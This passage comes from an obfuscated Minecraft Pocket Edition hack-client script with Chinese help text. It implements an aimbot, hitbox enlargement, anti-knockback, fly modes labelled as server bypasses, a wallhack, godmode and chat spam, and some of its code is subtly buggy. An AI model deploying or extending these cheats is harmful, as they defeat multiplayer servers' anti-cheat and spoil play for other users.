                        menu1['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitcombatUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitcombatUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitcombatUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitcombatUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitmotion() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitmotionUI['dismiss']();
                        menu2['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitmotionUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitmotionUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitmotionUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitmotionUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitplayer() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitplayerUI['dismiss']();
                        menu3['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitplayerUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitplayerUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitplayerUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitplayerUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function exitmisc() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x15c = new LinearLayout(ctx);
                var _0x2bf6x15d = new Button(ctx);
                _0x2bf6x15d['setText']('X');
                _0x2bf6x15d['setTextColor'](Color['rgb'](255, 128, 0));
                _0x2bf6x15d['setTextSize'](15);
                _0x2bf6x15d['setBackground'](xbg);
                _0x2bf6x15d['getBackground']()['setAlpha'](150);
                _0x2bf6x15d['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        exitmiscUI['dismiss']();
                        menu4['dismiss']();
                        mainMenu();
                        exit()
                    }
                }));
                _0x2bf6x15c['addView'](_0x2bf6x15d);
                exitmiscUI = new PopupWindow(_0x2bf6x15c, dip2px(40), dip2px(40));
                exitmiscUI['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                exitmiscUI['setAnimationStyle'](android['R']['style'].Animation_Translucent);
                exitmiscUI['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['BOTTOM'], 0, 0)
            } catch (exception) {
                Toast['makeText'](ctx, exception, 1)['show']()
            }
        }
    }))
}

function getNearestEntity(_0x2bf6x163) {
    var _0x2bf6x164 = Server['getAllPlayers']();
    var _0x2bf6x165 = _0x2bf6x163;
    var _0x2bf6x166 = null;
    for (var _0x2bf6x167 = 0; _0x2bf6x167 < _0x2bf6x164['length']; _0x2bf6x167++) {
        var _0x2bf6x28 = Entity['getX'](_0x2bf6x164[_0x2bf6x167]) - getPlayerX();
        var _0x2bf6x27 = Entity['getY'](_0x2bf6x164[_0x2bf6x167]) - getPlayerY();
        var _0x2bf6x29 = Entity['getZ'](_0x2bf6x164[_0x2bf6x167]) - getPlayerZ();
        var _0x2bf6x168 = Math['sqrt'](Math['pow'](_0x2bf6x28, 2) + Math['pow'](_0x2bf6x27, 2) + Math['pow'](_0x2bf6x29, 2));
        if (_0x2bf6x168 < _0x2bf6x165 && _0x2bf6x168 > 0 && Entity['getHealth'](_0x2bf6x164[_0x2bf6x167]) >= 1 && isNotTeam(_0x2bf6x166)) {
            _0x2bf6x165 = _0x2bf6x168;
            _0x2bf6x166 = _0x2bf6x164[_0x2bf6x167]
        }
    };
    if (isNotTeam(_0x2bf6x166)) {
        return _0x2bf6x166
    }
}

function nearArrow(_0x2bf6x16a) {
    var _0x2bf6x16b = Entity['getAll']();
    var _0x2bf6x165 = _0x2bf6x16a;
    var _0x2bf6x166 = null;
    for (var _0x2bf6x167 = 0; _0x2bf6x167 < _0x2bf6x16b['length']; _0x2bf6x167++) {
        var _0x2bf6x28 = Entity['getX'](_0x2bf6x16b[_0x2bf6x167]) - getPlayerX();
        var _0x2bf6x27 = Entity['getY'](_0x2bf6x16b[_0x2bf6x167]) - getPlayerY();
        var _0x2bf6x29 = Entity['getZ'](_0x2bf6x16b[_0x2bf6x167]) - getPlayerZ();
        var _0x2bf6x168 = Math['sqrt'](Math['pow'](_0x2bf6x28, 2) + Math['pow'](_0x2bf6x27, 2) + Math['pow'](_0x2bf6x29, 2));
        if (_0x2bf6x168 < _0x2bf6x165 && _0x2bf6x168 > 0) {
            _0x2bf6x165 = _0x2bf6x168;
            _0x2bf6x166 = _0x2bf6x16b[_0x2bf6x167]
        }
    };
    return _0x2bf6x166
}

function removeColors(_0x2bf6x25) {
    var _0x2bf6x16d = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'k', 'l', 'm', 'n', 'o', 'r'];
    if (_0x2bf6x25 != null) {
        _0x2bf6x16d['forEach'](function(_0x2bf6x16e) {
            _0x2bf6x25 = _0x2bf6x25['replace'](new RegExp('§' + _0x2bf6x16e, 'g'), '')
        });
        return _0x2bf6x25
    } else {
        return ''
    }
}

function isNotTeam(_0x2bf6x166) {
    var _0x2bf6x170 = true;
    for (i = 0; i < team['length']; i++) {
        var _0x2bf6x171 = removeColors(Entity['getNameTag'](_0x2bf6x166));
        if (_0x2bf6x171 == team[i]) {
            _0x2bf6x170 = false
        }
    };
    return _0x2bf6x170
}

function aimAtEnt(_0x2bf6x166, _0x2bf6x173) {
    if (_0x2bf6x166 != null) {
        var _0x2bf6x174 = Entity['getX'](_0x2bf6x166) - getPlayerX();
        var _0x2bf6x175 = Entity['getY'](_0x2bf6x166) - getPlayerY();
        var _0x2bf6x176 = Entity['getZ'](_0x2bf6x166) - getPlayerZ();
        if (_0x2bf6x173 != null && posinstanceofArray) {
            _0x2bf6x174 = Entity['getX'](_0x2bf6x166) - _0x2bf6x173[0];
            _0x2bf6x175 = Entity['getY'](_0x2bf6x166) - _0x2bf6x173[1];
            _0x2bf6x176 = Entity['getZ'](_0x2bf6x166) - _0x2bf6x173[2]
        };
        var _0x2bf6x177 = '63';
        if (Entity['getEntityTypeId'](_0x2bf6x166) != _0x2bf6x177) {
            _0x2bf6x175 += 0.5
        };
        var _0x2bf6x178 = Entity['getX'](_0x2bf6x166) + 0.5;
        var _0x2bf6x179 = Entity['getY'](_0x2bf6x166);
        var _0x2bf6x17a = Entity['getZ'](_0x2bf6x166) + 0.5;
        var _0x2bf6x17b = Math['sqrt'](_0x2bf6x174 * _0x2bf6x174 + _0x2bf6x175 * _0x2bf6x175 + _0x2bf6x176 * _0x2bf6x176);
        var _0x2bf6x175 = _0x2bf6x175 / _0x2bf6x17b;
        var _0x2bf6x17c = Math['asin'](_0x2bf6x175);
        _0x2bf6x17c = _0x2bf6x17c * 180.0 / Math['PI'];
        _0x2bf6x17c = -_0x2bf6x17c;
        var _0x2bf6x17d = -Math['atan2'](_0x2bf6x178 - (Player['getX']() + 0.5), _0x2bf6x17a - (Player['getZ']() + 0.5)) * (180 / Math['PI']);
        if (_0x2bf6x17c < 89 && _0x2bf6x17c > -89) {
            Entity['setRot'](Player['getEntity'](), _0x2bf6x17d, _0x2bf6x17c)
        }
    }
}

function bowAimAt(_0x2bf6x166) {
    var _0x2bf6x17f = 1;
    var _0x2bf6x180 = Entity['getX'](_0x2bf6x166) - Player['getX']();
    var _0x2bf6x181 = Entity['getEntityTypeId'](_0x2bf6x166) == EntityType['PLAYER'] ? Entity['getY'](_0x2bf6x166) - Player['getY']() : Entity['getY'](_0x2bf6x166) + 1 - Player['getY']();
    var _0x2bf6x182 = Entity['getZ'](_0x2bf6x166) - Player['getZ']();
    var _0x2bf6x17d = (Math['atan2'](_0x2bf6x182, _0x2bf6x180) * 180 / Math['PI']) - 90;
    var _0x2bf6x183 = Math['sqrt'](_0x2bf6x180 * _0x2bf6x180 + _0x2bf6x182 * _0x2bf6x182);
    var _0x2bf6x184 = 0.007;
    var _0x2bf6x185 = (_0x2bf6x17f * _0x2bf6x17f * _0x2bf6x17f * _0x2bf6x17f - _0x2bf6x184 * (_0x2bf6x184 * (_0x2bf6x183 * _0x2bf6x183) + 2 * _0x2bf6x181 * (_0x2bf6x17f * _0x2bf6x17f)));
    var _0x2bf6x17c = -(180 / Math['PI']) * (Math['atan']((_0x2bf6x17f * _0x2bf6x17f - Math['sqrt'](_0x2bf6x185)) / (_0x2bf6x184 * _0x2bf6x183)));
    if (_0x2bf6x17c < 89 && _0x2bf6x17c > -89) {
        setRot(Player['getEntity'](), _0x2bf6x17d, _0x2bf6x17c)
    }
}

function entityHurtHook(_0x2bf6x187, _0x2bf6x188, _0x2bf6x189) {
    if (antikbss) {
        return;
        Entity['setImmobile'](getPlayerEnt, true);
        kbTick = 1
    }
}

function toDirectionalVector(_0x2bf6x18b, _0x2bf6x18c, _0x2bf6x18d) {
    _0x2bf6x18b[0] = Math['cos'](_0x2bf6x18c) * Math['cos'](_0x2bf6x18d);
    _0x2bf6x18b[1] = Math['sin'](_0x2bf6x18d);
    _0x2bf6x18b[2] = Math['sin'](_0x2bf6x18c) * Math['cos'](_0x2bf6x18d)
}

function attackHook(_0x2bf6x187, _0x2bf6x188) {
    if (_0x2bf6x187 == Player['getEntity']() && grappless && Entity['getHealth'](_0x2bf6x188) > 0) {
        setPosition(getPlayerEnt(), Entity['getX'](_0x2bf6x188), Entity['getY'](_0x2bf6x188), Entity['getZ'](_0x2bf6x188))
    };
    if (_0x2bf6x187 == Player['getEntity']() && criticales && Entity['getHealth'](_0x2bf6x188) > 0) {
        if (critTick >= 13) {
            critTick = 0
        }
    };
    if (_0x2bf6x187 == Player.getEntity() && bypasshitboxs && Entity.getHealth(_0x2bf6x188) > 0) {
        Entity.setCollisionSize(_0x2bf6x188, 10, 30);
    }
    if (_0x2bf6x187 == Player['getEntity']() && hitjumpss && Utils['Player']['isOnGround']()) {
        setVelY(getPlayerEnt(), 0.4)
    };
    if (_0x2bf6x187 == Player['getEntity']() && firepunchss) {
        var _0x2bf6x18f = Entity['getX'](_0x2bf6x188);
        var _0x2bf6x190 = Entity['getY'](_0x2bf6x188);
        var _0x2bf6x191 = Entity['getZ'](_0x2bf6x188);
        Level['addParticle'](ParticleType['lava'], _0x2bf6x18f - 0.2, _0x2bf6x190 + 1, _0x2bf6x191, 0, 0, 0, 180);
        Level['addParticle'](ParticleType['flame'], _0x2bf6x18f - 0.2, _0x2bf6x190 + 1, _0x2bf6x191, 0, 0, 0, 400);
        Entity['setFireTicks'](_0x2bf6x188, 999)
    };
    if (_0x2bf6x187 == Player['getEntity']() && behindhitss) {
        var _0x2bf6x192 = getYaw() + 90;
        var _0x2bf6x193 = getPitch() - 180;
        x = Math['cos'](_0x2bf6x192 * (Math['PI'] / 180));
        y = Math['sin'](_0x2bf6x193 * (Math['PI'] / 180));
        z = Math['sin'](_0x2bf6x192 * (Math['PI'] / 180));
        setVelX(Player['getEntity'](), x * 1);
        setVelY(Player['getEntity'](), y * 1);
        setVelZ(Player['getEntity'](), z * 1)
    }
}

function destroyBlock(_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, _0x2bf6x195) {
    if (forcedestroyss && getTile(_0x2bf6x28, _0x2bf6x27, _0x2bf6x29) != 0) {
        Level['setTile'](_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, 0, 0)
    }
}

function useItem(_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, _0x2bf6x197, _0x2bf6x198, _0x2bf6x195, _0x2bf6x199, _0x2bf6x19a) {
    if (tapjumpss) {
        setVelY(getPlayerEnt(), 0.4)
    };
    if (taptpss && getTile(_0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29) == 0 && getTile(_0x2bf6x28, _0x2bf6x27 + 2, _0x2bf6x29) == 0) {
        Entity['setPosition'](Player['getEntity'](), _0x2bf6x28 + 0.5, _0x2bf6x27 + 2.63, _0x2bf6x29 + 0.5)
    };
    if (placetpss) {
        if (_0x2bf6x195 == BlockFace['NORTH']) {
            Entity['setPositionRelative'](getPlayerEnt(), 0, 0, -1)
        } else {
            if (_0x2bf6x195 == BlockFace['SOUTH']) {
                Entity['setPositionRelative'](getPlayerEnt(), 0, 0, 1)
            } else {
                if (_0x2bf6x195 == BlockFace['WEST']) {
                    Entity['setPositionRelative'](getPlayerEnt(), -1, 0, 0)
                } else {
                    if (_0x2bf6x195 == BlockFace['EAST']) {
                        Entity['setPositionRelative'](getPlayerEnt(), 1, 0, 0)
                    } else {
                        if (_0x2bf6x195 == BlockFace['UP']) {
                            Entity['setPositionRelative'](getPlayerEnt(), 0, 1, 0)
                        }
                    }
                }
            }
        }
    };
    if (ghosthandss && Player['getCarriedItem']() == 0) {
        Level['setTile'](_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, 0, 0);
        Level['setTile'](_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 0, 0)
    }
}

function modTick() {
    timer++;
    var _0x2bf6x19c = Player['getX']();
    var _0x2bf6x19d = Player['getY']();
    var _0x2bf6x19e = Player['getZ']();
    var _0x2bf6x28 = Player['getX']();
    var _0x2bf6x27 = Player['getY']();
    var _0x2bf6x29 = Player['getZ']();
    if (antikbss || Entity['getHealth'](getPlayerEnt()) <= 0) {
        if (kbTick >= 1) {
            kbTick--
        } else {
            Entity['setImmobile'](getPlayerEnt(), false)
        };
        if (kbHealth > Entity['getHealth'](getPlayerEnt())) {
            Entity['setImmobile'](getPlayerEnt(), true);
            kbTick = 1
        };
        kbTick = 0;
        kbHealth = Entity['getHealth'](getPlayerEnt())
    };
    if (ndglidess) {
        setVelY(getPlayerEnt(), 0.00000001)
    };
    if (reachss) {
        if (Level['getGameMode']() == 0) {
            Level['setGameMode'](1);
            Player['setCanFly'](false)
        }
    };
    if (stepss && Utils['Player']['isCollidedHorizontally']()) {
        Entity['setPositionRelative'](getPlayerEnt(), 0, 1.6, 0)
    };
    if (cstepss && Utils['Player']['isCollidedHorizontally']()) {
        setVelY(Player['getEntity'](), 0.6)
    };
    if (speedss && Utils['Player']['isOnGround']()) {
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.5);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.5)
    };
    if (zoomspeedss) {
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.1);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.1)
    };
    if (upglidess) {
        setVelY(getPlayerEnt(), 0.3)
    };
    if (criticaltrailsss) {
        Level['addParticle'](ParticleType['crit'], getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 10)
    };
    if (highjumpss) {
        if (Entity['getVelY'](getPlayerEnt()) < -0.1) {
            setVelY(getPlayerEnt(), -0.5)
        };
        if (Entity['getVelY'](getPlayerEnt()) < 0.35 && Entity['getVelY'](getPlayerEnt()) > 0.2 && can == 1 && canGetHP == 1) {
            setVelY(getPlayerEnt(), 0.6);
            can = 2;
            HP = Entity['getHealth'](getPlayerEnt());
            canGetHP = 0
        };
        if (Entity['getVelY'](getPlayerEnt()) > gravity && can == 2) {
            Player['setHealth'](HP);
            canGetHP = 1;
            can = 0

        };
        if (Entity['getVelY'](getPlayerEnt()) == gravity && can == 0) {
            Player['setHealth'](HP);
            canGetHP = 1;
            can = 1
        }
    };
    if (isDev == false && Entity['getNameTag'](getPlayerEnt()) == 'FirePro9978' || Entity['getNameTag'](getPlayerEnt()) == 'NNeBBuRR') {
        canBeDev = true
    };
    if (autowalkss) {
        var _0x2bf6x13a = [0, 0, 0];
        toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
        setVelX(getPlayerEnt(), 0.4 * _0x2bf6x13a[0]);
        setVelZ(getPlayerEnt(), 0.4 * _0x2bf6x13a[2])
    };
    if (jetpackss) {
        var _0x2bf6x192 = getYaw() + 90;
        var _0x2bf6x193 = getPitch() - 180;
        _0x2bf6x28 = Math['cos'](_0x2bf6x192 * (Math['PI'] / 180));
        _0x2bf6x27 = Math['sin'](_0x2bf6x193 * (Math['PI'] / 180));
        _0x2bf6x29 = Math['sin'](_0x2bf6x192 * (Math['PI'] / 180));
        setVelX(Player['getEntity'](), _0x2bf6x28 * 1);
        setVelY(Player['getEntity'](), _0x2bf6x27 * 1);
        setVelZ(Player['getEntity'](), _0x2bf6x29 * 1)
    };
    if (cspeedss) {
        if (Entity['isSneaking'](Player['getEntity']()) == true) {
            setVelY(getPlayerEnt(), -100.0);
            setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.7);
            setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.7)
        }
    };
    if (team[0] == null) {
        team['push']('随枫吖');
    };
    if (dolphinss && Utils['Player']['isInWater']()) {
        setVelY(getPlayerEnt(), 0.1)
    };
    if (solidliquidss) {
        Block['setShape'](8, null, null, null, null, null, null);
        Block['setShape'](9, null, null, null, null, null, null);
        Block['setShape'](10, null, null, null, null, null, null);
        Block['setShape'](11, null, null, null, null, null, null);
        Block['defineBlock'](8, 'Water', [
            ['still_water', 0]
        ], 8, true, 4);
        Block['defineBlock'](9, 'Stationary Water', [
            ['still_water', 0]
        ], 9, true, 4);
        Block['defineBlock'](10, 'Lava', [
            ['still_lava', 0]
        ], 10, true, 4);
        Block['defineBlock'](11, 'Stationary Lava', [
            ['still_lava', 0]
        ], 11, true, 4)
    };
    if (wallhackss) {
        Entity['setCollisionSize'](Player['getEntity'](), 0, 0)
    };
    if (glidess) {
        setVelY(getPlayerEnt(), -glideSpeed)
    };
    if (dmgglidess) {
        setPosition(getPlayerEnt(), _0x2bf6x19c, _0x2bf6x19d + 0.19, _0x2bf6x19e);
        setVelY(getPlayerEnt(), -0.3)
    };
    if (criticales && critTick < 22) {
        critTick++;
        if (critTick == 13) {
            Entity['setPositionRelative'](getPlayerEnt(), 0, 2, 0)
        };
        if (critTick == 12) {
            criticalTick = 12
        };
        if (criticalTick > 0) {
            criticalTick--;
            setVelY(getPlayerEnt(), -0.2)
        }
    };
    if (hitboxs) {
        ent = getNearestEntity(7);
        Entity.setCollisionSize(ent, 7.3, 10);
    }
    if (mineplexflys) {
        Player['setCanFly'](true);
        Player['setFlying'](true)
    };
    if (mineplexflys) {
        setVelY(getPlayerEnt(), -0.007);
    }
    if (inpvpflys) {
        setPosition(getPlayerEnt(), _0x2bf6x19c, _0x2bf6x19d + 0.19, _0x2bf6x19e);
        setVelY(getPlayerEnt(), -0.2)
    };
    if (autoswordss) {
        var _0x2bf6x19f = 0;
        var _0x2bf6x1a0 = Player['getInventorySlot'](_0x2bf6x19f);
        if (_0x2bf6x1a0 == 276 || _0x2bf6x1a0 == 268 || _0x2bf6x1a0 == 283 || _0x2bf6x1a0 == 267 || _0x2bf6x1a0 == 272) {
            var _0x2bf6x1a1 = _0x2bf6x19f
        } else {
            _0x2bf6x19f++
        };
        if (_0x2bf6x19f = 27) {
            _0x2bf6x19f = 0
        };
        var _0x2bf6x166 = getNearestEntity(7);
        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
            Player['setSelectedSlotId'](_0x2bf6x1a1)
        }
    };
    if (jumpspeedss && Utils['Player']['isOnGround']()) {
        setVelY(getPlayerEnt(), 0.2);
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.7);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.7)
    };
    if (bypassglidess) {
        bgtick++;
        if (Entity['getVelY'](getPlayerEnt()) < 1) {
            setVelY(Player['getEntity'](), -0.2);
            if (bgtick == 8) {
                setVelY(getPlayerEnt(), -0.5);
                setVelX(getPlayerEnt(), 0);
                setVelZ(getPlayerEnt(), 0);
                bgtick = 0
            }
        }
    };
    if (longhopss && Utils['Player']['isOnGround']()) {
        lhtick++;
        if (lhtick >= 8) {
            lhtick = 0
        };
        if (Utils['Velocity']['calculateSpeed']() >= 0.106 && lhtick == 0) {
            var _0x2bf6x13a = [0, 0, 0];
            toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
            setVelX(getPlayerEnt(), _0x2bf6x13a[0]);
            setVelY(getPlayerEnt(), 0.45);
            setVelZ(getPlayerEnt(), _0x2bf6x13a[2])
        } else {
            if (Utils['Velocity']['calculateSpeed']() <= 0.105 && lhtick == 0) {
                setVelX(getPlayerEnt(), 0);
                setVelZ(getPlayerEnt(), 0)
            }
        }
    };
    if (autoclimbss && Utils['Player']['isOnLadder']()) {
        setVelY(getPlayerEnt(), acspd)
    };
    if (sglidess) {
        Entity['setVelY'](getPlayerEnt(), -0.500);
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.2);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.2)
    };
    if (fastbreakss) {
        Utils['Block']['fastBreak']()
    };
    if (fullbrightss) {
        Block['setLightLevel'](0, 15)
    };
    if (timer % 5 == 0 && Utils['Player']['isOnGround']()) {
        fallbackX = Player['getX']();
        fallbackY = Player['getY']();
        fallbackZ = Player['getZ']()
    };
    if (timer % 2 == 0 && Utils['Player']['isOnGround']()) {
        regenX = Player['getX']();
        regenZ = Player['getX']()
    };
    if (fallbackss) {
        var _0x2bf6x1a2 = Player['getX']();
        var _0x2bf6x1a3 = Player['getY']();
        var _0x2bf6x1a4 = Player['getZ']();
        if (fallbackY - 2 > _0x2bf6x1a3) {
            Entity['setPosition'](Player['getEntity'](), fallbackX, fallbackY, fallbackZ)
        }
    };
    if (fastfallss) {
        if (!Utils['Player']['isOnGround']() && Entity['getVelY'](getPlayerEnt()) <= -0.07840000092983246 || fallbackY - 2 > _0x2bf6x27) {
            setVelY(getPlayerEnt(), -100)
        }
    };
    if (regenerationss) {
        var _0x2bf6x1a2 = Player['getX']();
        var _0x2bf6x1a4 = Player['getZ']();
        if (Entity['getHealth'](getPlayerEnt()) != 20 && Player['getHunger']() == 20 && regenX == _0x2bf6x1a2 || regenZ == _0x2bf6x1a4) {
            ModPE['setGameSpeed'](120)
        } else {
            if (Entity['getHealth'](getPlayerEnt()) == 20 && regenX != _0x2bf6x1a2 || regenZ != _0x2bf6x1a4) {
                ModPE['setGameSpeed'](20)
            }
        }
    };
    if (sregenss) {
        ModPE['setGameSpeed'](120);
        Entity['setImmobile'](Player['getEntity'](), true)
    };
    if (lbsgspeedss) {
        ModPE['setGameSpeed'](30)
    };
    if (frostwalkerss) {
        var _0x2bf6x28 = Player['getX']();
        var _0x2bf6x27 = Player['getY']();
        var _0x2bf6x29 = Player['getZ']();
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 8) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 79, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 9) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 79, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 10) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 4, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 11) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 4, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 8) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 79, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 9) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 79, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 10) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 4, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 11) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 4, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        }
    };
    if (safewalkss) {
        Entity['setSneaking'](Player['getEntity'](), true)
    };
    if (scaffoldwalkss) {
        var _0x2bf6x28 = Player['getX']();
        var _0x2bf6x27 = Player['getY']();
        var _0x2bf6x29 = Player['getZ']();
        setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 87, 0)
    };
    if (arrowdodgess) {
        var _0x2bf6x1a5 = nearArrow(5);
        if (_0x2bf6x1a5 != null && Entity['getEntityTypeId'](_0x2bf6x1a5) == EntityType['ARROW']) {
            setPosition(getPlayerEnt(), _0x2bf6x28 + 0.5, _0x2bf6x27, _0x2bf6x29)
        }
    };
    if (bedbreakerss) {
        if (Player['getPointedBlockId']() == 26) {
            Level['destroyBlock'](Player['getPointedBlockX'](), Player['getPointedBlockY'](), Player['getPointedBlockZ'](), true)
        }
    };
    if (godmodes) {
        Player.setHealth(20);
    }
}

function chatHook(_0x2bf6x25) {
    var _0x2bf6x1a7 = _0x2bf6x25['split'](' ');
    var fct = '§l§4[§r§6随枫吖§l§4§l]§r§6: ';
    if (_0x2bf6x25['charAt'](0) == '!') {
        preventDefault();
        com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']()['updateTextboxText']('')
    };
    if (_0x2bf6x1a7[0] == '!') {
        clientMessage(fct + '命令不正确，请使用 !help <page>');
        preventDefault()
    };
    if (_0x2bf6x1a7[0] == '!help') {
        if (_0x2bf6x1a7[1] == '1' || _0x2bf6x1a7[1] == null) {
            clientMessage(fct + '帮助页码: 1/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!help > 查看可用的命令 > : !help <page>');
            clientMessage(fct + '!glidespeed > 使用滑动模块设置滑行速度 > 使用: !glidespeed <number> or default');
            clientMessage(fct + '!setfov > 用指定的数字设置FOV > 使用: !setfov <number or default>');
            clientMessage(fct + '!setspeed > 用指定的数字设置游戏速度 > 使用: !setspeed <number or default>');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '2') {
            clientMessage(fct + '帮助页码: 2/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!gamemode > 将您的游戏设置为指定的游戏 > 使用: !gamemode <number> or gamemode');
            clientMessage(fct + '!vclip > 输入数字给传送到新高度 > 使用: !vclip <number, can use - like -3>');
            clientMessage(fct + '!team > 添加或删除给定名称上的队友(可以不会自瞄他) > 使用: !team <add or remove> <nametag>');
            clientMessage(fct + '!teamlist > 在聊天中展示你的队友 > 使用: !teamlist');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '3') {
            clientMessage(fct + '帮助页码: 3/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!spam > 设置单词来使用刷屏 > 使用: !spam <word>');
            clientMessage(fct + '!spamdelay > 设置使用刷屏时的发送延迟 > 使用: !spamdelay <seconds>');
            clientMessage(fct + '!acspeed > 设定自动爬墙速度 > 使用: !acspeed <speed>');
            clientMessage(fct + '!nwrange > 设置玩家提示信息范围 > 使用: !nwrange <range>');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '4') {
            clientMessage(fct + '帮助页码: 4/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!freeze > 定住自己(你仍然可以看到发生了什么) > 使用: !freeze <on/off>');
            clientMessage(fct + '!info > 提供客户及其开发人员的信息 > 使用: !info');
